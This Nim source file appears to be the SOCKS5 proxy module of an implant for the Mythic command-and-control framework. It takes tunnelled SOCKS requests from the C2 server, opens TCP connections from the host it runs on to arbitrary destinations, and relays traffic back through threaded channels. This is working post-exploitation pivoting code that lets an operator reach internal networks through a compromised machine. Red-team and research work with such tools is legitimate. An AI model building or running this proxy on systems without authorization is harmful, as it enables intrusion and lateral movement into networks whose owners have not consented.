import std/[json, net, nativesockets, strutils, base64, strformat, tables, os]
import ../utils/mythic_responses
import ../utils/debug

# SOCKS5 Protocol Constants
const
  SOCKS5_VERSION = 0x05'u8
  NO_AUTH = 0x00'u8
  CMD_CONNECT = 0x01'u8
  ATYP_IPV4 = 0x01'u8
  ATYP_DOMAIN = 0x03'u8
  ATYP_IPV6 = 0x04'u8
  
  # SOCKS5 Reply Codes
  SUCCESS_REPLY = 0x00'u8
  SERVER_FAILURE = 0x01'u8
  CONNECTION_REFUSED = 0x05'u8
  COMMAND_NOT_SUPPORTED = 0x07'u8
  ADDR_TYPE_NOT_SUPPORTED = 0x08'u8
  
  BUFFER_SIZE = 4096
  SLEEP_INTERVAL_MS = 0  # Use cpuRelax() for minimal latency

type
  SocksMessage* = object
    exit*: bool
    server_id*: uint32
    data*: string  # base64 encoded, empty if none
    port*: int     # 0 if none
  
  AddrSpec = object
    case isIp: bool
    of true:
      ip: string
    of false:
      fqdn: string
    port: uint16
  
  ConnectionState = enum
    AwaitingConnect
    Connected
  
  SocksConnectionObj = object
    serverId: uint32
    state: ConnectionState
    socket: Socket
    active: bool
    receivedEof: bool  # True when reader thread sends empty seq EOF signal
    inChannel: ptr Channel[seq[byte]]   # Mythic → Writer → Socket
    outChannel: ptr Channel[seq[byte]]  # Socket → Reader → Mythic
    readerThread: Thread[ptr SocksConnectionObj]
    writerThread: Thread[ptr SocksConnectionObj]
  
  SocksConnection = ref object
    serverId: uint32
    state: ConnectionState
    socket: Socket
    active: bool
    receivedEof: bool
    inChannel: ptr Channel[seq[byte]]
    outChannel: ptr Channel[seq[byte]]
    readerThread: Thread[ptr SocksConnectionObj]
    writerThread: Thread[ptr SocksConnectionObj]
    sharedPtr: ptr SocksConnectionObj  # Stable pointer for threads

var
  activeSocksConnections {.threadvar.}: Table[uint32, SocksConnection]
  socksActive* = false

proc createSocksMessage*(serverId: uint32, exit: bool, data: string = "", port: int = 0): JsonNode =
  ## Create a SOCKS message to send to Mythic
  result = %*{
    "server_id": serverId,
    "exit": exit
  }
  if data.len > 0:
    result["data"] = %data
  if port > 0:
    result["port"] = %port

proc readFromDestination(conn: ptr SocksConnectionObj) {.thread.} =
  ## Thread that reads from remote socket and sends to Mythic via main thread
  var buffer = newSeq[byte](BUFFER_SIZE)
  
  while conn[].active:
    try:
      let bytesRead = conn[].socket.recv(addr buffer[0], BUFFER_SIZE)
      
      if bytesRead == 0:
        # Connection closed by remote
        conn[].active = false
        # Signal EOF
        conn[].outChannel[].send(@[])
        break
      elif bytesRead > 0:
        # Send data to main thread for forwarding to Mythic
        conn[].outChannel[].send(buffer[0..<bytesRead])
      elif bytesRead < 0:
        # Non-blocking socket would block - no data available
        sleep(1)  # Sleep 1ms to avoid busy-waiting
      
    except:
      # Socket error - connection closed or reset
      conn[].active = false
      conn[].outChannel[].send(@[])
      break
  
  # Thread exiting - close socket if still open
  try:
    conn[].socket.close()
  except:
    discard

proc writeToDestination(conn: ptr SocksConnectionObj) {.thread.} =
  ## Thread that receives data from Mythic and writes to remote socket
  while conn[].active:
    let (available, data) = conn[].inChannel[].tryRecv()
    if available and data.len > 0:
      var sent = 0
      while sent < data.len and conn[].active:
        try:
          let bytesSent = conn[].socket.send(unsafeAddr data[sent], data.len - sent)
          if bytesSent > 0:
            sent += bytesSent
          else:
            # send returned 0 on non-blocking socket, yield and retry
            sleep(1)  # Sleep 1ms to avoid busy-waiting
        except OSError as e:
          # Treat EWOULDBLOCK/WSAEWOULDBLOCK as congestion, yield and retry
          when defined(windows):
            const WsaWouldBlock = 10035'i32
            if e.errorCode.int32 == WsaWouldBlock:
              sleep(1)  # Sleep 1ms to avoid busy-waiting
              continue
          else:
            const EwouldBlock = 11'i32
            if e.errorCode.int32 == EwouldBlock:
              sleep(1)  # Sleep 1ms to avoid busy-waiting
              continue
          # Any other error closes the connection
          conn[].active = false
          break
    else:
      # Sleep briefly when no data to avoid busy-waiting
      sleep(1)  # Sleep 1ms

proc buildSocks5Reply(replyCode: uint8, localAddr: string, localPort: uint16): seq[byte] =
  ## Build SOCKS5 reply packet
  result = @[
    SOCKS5_VERSION,
    replyCode,
    0x00'u8  # Reserved
  ]
  
  # Try to parse as IPv4 first
  try:
    let parts = localAddr.split('.')
    if parts.len == 4:
      result.add(ATYP_IPV4)
      for part in parts:
        result.add(part.parseInt().uint8)
    else:
      # IPv6 or domain - for simplicity use IPv4 0.0.0.0
      result.add(ATYP_IPV4)
      result.add([0'u8, 0'u8, 0'u8, 0'u8])
  except:
    # Fallback to 0.0.0.0
    result.add(ATYP_IPV4)
    result.add([0'u8, 0'u8, 0'u8, 0'u8])
  
  # Add port (big-endian)
  result.add((localPort shr 8).uint8)
  result.add((localPort and 0xFF).uint8)

proc parseSocks5Request(data: seq[byte]): (bool, AddrSpec, uint8) =
  ## Parse SOCKS5 CONNECT request
  ## Returns: (success, addrSpec, errorCode)
  let dummyAddr = AddrSpec(isIp: true, ip: "0.0.0.0", port: 0)
  
  if data.len < 4:
    return (false, dummyAddr, SERVER_FAILURE)
  
  if data[0] != SOCKS5_VERSION:
    return (false, dummyAddr, SERVER_FAILURE)
  
  if data[1] != CMD_CONNECT:
    return (false, dummyAddr, COMMAND_NOT_SUPPORTED)
  
  let addrType = data[3]
  
  # Parse based on address type
  if addrType == ATYP_IPV4:
    if data.len < 10:
      return (false, dummyAddr, SERVER_FAILURE)
    let addrSpec = AddrSpec(
      isIp: true,
      ip: &"{data[4]}.{data[5]}.{data[6]}.{data[7]}",
      port: (data[8].uint16 shl 8) or data[9].uint16
    )
    return (true, addrSpec, SUCCESS_REPLY)
  
  elif addrType == ATYP_DOMAIN:
    if data.len < 5:
      return (false, dummyAddr, SERVER_FAILURE)
    let domainLen = data[4].int
    if data.len < 5 + domainLen + 2:
      return (false, dummyAddr, SERVER_FAILURE)
    var domain = newString(domainLen)
    for i in 0..<domainLen:
      domain[i] = data[5 + i].char
    let portOffset = 5 + domainLen
    let addrSpec = AddrSpec(
      isIp: false,
      fqdn: domain,
      port: (data[portOffset].uint16 shl 8) or data[portOffset + 1].uint16
    )
    return (true, addrSpec, SUCCESS_REPLY)
  
  elif addrType == ATYP_IPV6:
    if data.len < 22:
      return (false, dummyAddr, SERVER_FAILURE)
    # For simplicity, convert to string representation
    var ipv6Parts: seq[string] = @[]
    for i in 0..<8:
      let offset = 4 + i * 2
      let part = (data[offset].uint16 shl 8) or data[offset + 1].uint16
      ipv6Parts.add(&"{part:x}")
    let addrSpec = AddrSpec(
      isIp: true,
      ip: ipv6Parts.join(":"),
      port: (data[20].uint16 shl 8) or data[21].uint16
    )
    return (true, addrSpec, SUCCESS_REPLY)
  
  else:
    return (false, dummyAddr, ADDR_TYPE_NOT_SUPPORTED)

proc handleNewConnection(serverId: uint32, data: seq[byte]): seq[JsonNode] =
  ## Handle new SOCKS connection or CONNECT request
  result = @[]
  
  debug &"[DEBUG] SOCKS: New connection {serverId}, {data.len} bytes"
  
  # Check if this is auth negotiation or CONNECT
  if data.len < 3 or data[0] != SOCKS5_VERSION:
    debug "[DEBUG] SOCKS: Invalid SOCKS5 version"
    return
  
  # Check if it's a CONNECT request (has CMD_CONNECT at position 1)
  let looksLikeConnect = data.len >= 10 and data[1] == CMD_CONNECT and data[2] == 0x00
  
  if not looksLikeConnect:
    # Auth negotiation: [5, nmethods, methods...]
    debug "[DEBUG] SOCKS: Auth negotiation, sending NO_AUTH response"
    
    # Send auth response: [5, 0] (version 5, no auth required)
    let authReply = @[SOCKS5_VERSION, NO_AUTH]
    let authReplyB64 = encode(authReply)
    result.add(createSocksMessage(serverId, false, authReplyB64))
    
    # Store connection in awaiting state
    var conn = SocksConnection(
      serverId: serverId,
      state: AwaitingConnect,
      active: true
    )
    activeSocksConnections[serverId] = conn
    return
  
  # Parse CONNECT request
  let (success, destAddr, errorCode) = parseSocks5Request(data)
  
  if not success:
    debug &"[DEBUG] SOCKS: Failed to parse CONNECT, error code {errorCode}"
    let errorReply = buildSocks5Reply(errorCode, "0.0.0.0", 0)
    let errorReplyB64 = encode(errorReply)
    result.add(createSocksMessage(serverId, true, errorReplyB64))
    return
  
  # Connect to destination
  let address = if destAddr.isIp: destAddr.ip else: destAddr.fqdn
  let portStr = $destAddr.port
  
  debug &"[DEBUG] SOCKS: Connecting to {address}:{portStr}"
  
  try:
    var socket = newSocket()
    socket.connect(address, Port(destAddr.port))
    
    # Disable Nagle's algorithm for better interactive protocol performance (RDP, SSH, etc)
    socket.setSockOpt(OptNoDelay, true, level = IPPROTO_TCP.cint)
    
    # Set non-blocking mode
    socket.getFd().SocketHandle.setBlocking(false)
    
    # Get local address for reply
    let (localAddr, localPort) = socket.getLocalAddr()
    let successReply = buildSocks5Reply(SUCCESS_REPLY, localAddr, localPort.uint16)
    let successReplyB64 = encode(successReply)
    
    debug &"[DEBUG] SOCKS: Connected successfully, local {localAddr}:{localPort}"
    
    # Create channels for thread communication
    var inChan = cast[ptr Channel[seq[byte]]](allocShared0(sizeof(Channel[seq[byte]])))
    inChan[].open()
    var outChan = cast[ptr Channel[seq[byte]]](allocShared0(sizeof(Channel[seq[byte]])))
    outChan[].open()
    
    # Create connection object
    var conn = SocksConnection(
      serverId: serverId,
      state: Connected,
      socket: socket,
      active: true,
      inChannel: inChan,
      outChannel: outChan
    )
    
    # Allocate stable shared memory for thread-safe access (won't move during GC or table rehash)
    let connPtr = cast[ptr SocksConnectionObj](allocShared0(sizeof(SocksConnectionObj)))
    connPtr.serverId = serverId
    connPtr.state = Connected
    connPtr.socket = socket
    connPtr.active = true
    connPtr.receivedEof = false
    connPtr.inChannel = inChan
    connPtr.outChannel = outChan
    
    # Store shared pointer in ref object for later cleanup
    conn.sharedPtr = connPtr
    
    # Store connection in table (keeps ref for GC, but threads use shared pointer)
    activeSocksConnections[serverId] = conn
    
    # Start threads using stable shared pointer
    createThread(conn.readerThread, readFromDestination, connPtr)
    createThread(conn.writerThread, writeToDestination, connPtr)
    
    result.add(createSocksMessage(serverId, false, successReplyB64))
    
  except:
    let e = getCurrentException()
    debug &"[DEBUG] SOCKS: Failed to connect: {e.msg}"
    let errorReply = buildSocks5Reply(CONNECTION_REFUSED, "0.0.0.0", 0)
    let errorReplyB64 = encode(errorReply)
    result.add(createSocksMessage(serverId, true, errorReplyB64))

proc socks*(taskId: string, params: JsonNode): JsonNode =
  ## Start or stop SOCKS proxy
  try:
    let port = params["port"].getInt()
    let action = params["action"].getStr()
    
    debug &"[DEBUG] SOCKS: Action={action}, Port={port}"
    
    case action
    of "start":
      socksActive = true
      activeSocksConnections = initTable[uint32, SocksConnection]()
      
      result = mythicSuccess(taskId, &"SOCKS proxy started on port {port}")
      result["completed"] = %false
      result["status"] = %"processing"
    
    of "stop":
      socksActive = false
      
      # Close all connections
      for serverId, conn in activeSocksConnections:
        conn.active = false
        if conn.state == Connected:
          conn.socket.close()
      
      activeSocksConnections.clear()
      
      result = mythicSuccess(taskId, "SOCKS proxy stopped")
      result["completed"] = %true
    
    else:
      result = mythicError(taskId, &"Unknown action: {action}")
    
  except:
    let e = getCurrentException()
    result = mythicError(taskId, &"SOCKS error: {e.msg}")

proc handleSocksMessages*(messages: seq[JsonNode]): seq[JsonNode] =
  ## Handle SOCKS messages from Mythic (forwarding data to connections)
  ## Returns array of SOCKS messages to send back to Mythic
  result = @[]
  
  for msg in messages:
    let serverId = msg["server_id"].getInt().uint32
    let exit = msg["exit"].getBool()
    
    debug &"[DEBUG] SOCKS: Message for connection {serverId}, exit={exit}"
    
    if exit:
      # Mark connection for closure (don't delete immediately - let threads finish)
      if activeSocksConnections.hasKey(serverId):
        var conn = activeSocksConnections[serverId]
        # Set active=false in BOTH the ref object and the shared object
        conn.active = false
        if not conn.sharedPtr.isNil:
          conn.sharedPtr.active = false
        debug &"[DEBUG] SOCKS: Marked connection {serverId} for cleanup (reader will drain remaining data)"
      continue
    
    if activeSocksConnections.hasKey(serverId):
      var conn = activeSocksConnections[serverId]
      
      case conn.state
      of AwaitingConnect:
        # Received CONNECT request
        if msg.hasKey("data") and msg["data"].kind != JNull:
          let dataB64 = msg["data"].getStr()
          let dataStr = decode(dataB64)
          var data = newSeq[byte](dataStr.len)
          for i in 0..<dataStr.len:
            data[i] = dataStr[i].byte
          let responses = handleNewConnection(serverId, data)
          result.add(responses)
      
      of Connected:
        # Forward data to remote socket via thread
        if msg.hasKey("data") and msg["data"].kind != JNull:
          let dataB64 = msg["data"].getStr()
          let dataStr = decode(dataB64)
          var data = newSeq[byte](dataStr.len)
          for i in 0..<dataStr.len:
            data[i] = dataStr[i].byte
          debug &"[DEBUG] SOCKS: Forwarding {data.len} bytes to connection {serverId}"
          conn.inChannel[].send(data)
    
    else:
      # New connection
      if msg.hasKey("data") and msg["data"].kind != JNull:
        let dataB64 = msg["data"].getStr()
        let dataStr = decode(dataB64)
        var data = newSeq[byte](dataStr.len)
        for i in 0..<dataStr.len:
          data[i] = dataStr[i].byte
        let responses = handleNewConnection(serverId, data)
        result.add(responses)

proc checkActiveSocksConnections*(): seq[JsonNode] =
  ## Check all active SOCKS connections for data from remote sockets
  ## Returns array of SOCKS messages to send to Mythic
  result = @[]
  var toDelete: seq[uint32] = @[]
  
  for serverId, conn in activeSocksConnections:
    if conn.state == Connected:
      # Check for data from thread (non-blocking) - drain channel even if inactive
      var (hasData, data) = conn.outChannel[].tryRecv()
      
      while hasData:
        if data.len == 0:
          # EOF signal from reader thread
          debug &"[DEBUG] SOCKS: Connection {serverId} EOF received from reader thread"
          result.add(createSocksMessage(serverId, true))
          conn.active = false
          if not conn.sharedPtr.isNil:
            conn.sharedPtr.active = false
          conn.receivedEof = true
          break
        
        # Send data to Mythic
        let dataB64 = encode(data)
        debug &"[DEBUG] SOCKS: Sending {data.len} bytes from connection {serverId} to Mythic"
        result.add(createSocksMessage(serverId, false, dataB64))
        
        # Check for more data
        (hasData, data) = conn.outChannel[].tryRecv()
      
      # Only delete if we've received EOF signal from reader thread
      # This ensures all buffered data is drained before cleanup
      if conn.receivedEof:
        toDelete.add(serverId)
    else:
      # AwaitingConnect state - delete immediately if inactive (no data to drain)
      if not conn.active:
        toDelete.add(serverId)
  
  # Delete inactive connections after iteration
  for serverId in toDelete:
    if activeSocksConnections.hasKey(serverId):
      let conn = activeSocksConnections[serverId]
      if conn.state == Connected:
        # Join threads first
        try:
          joinThread(conn.readerThread)
        except:
          discard
        try:
          joinThread(conn.writerThread)
        except:
          discard
        
        # Free shared memory used by threads
        if not conn.sharedPtr.isNil:
          deallocShared(conn.sharedPtr)
    activeSocksConnections.del(serverId)
    debug &"[DEBUG] SOCKS: Deleted inactive connection {serverId}"
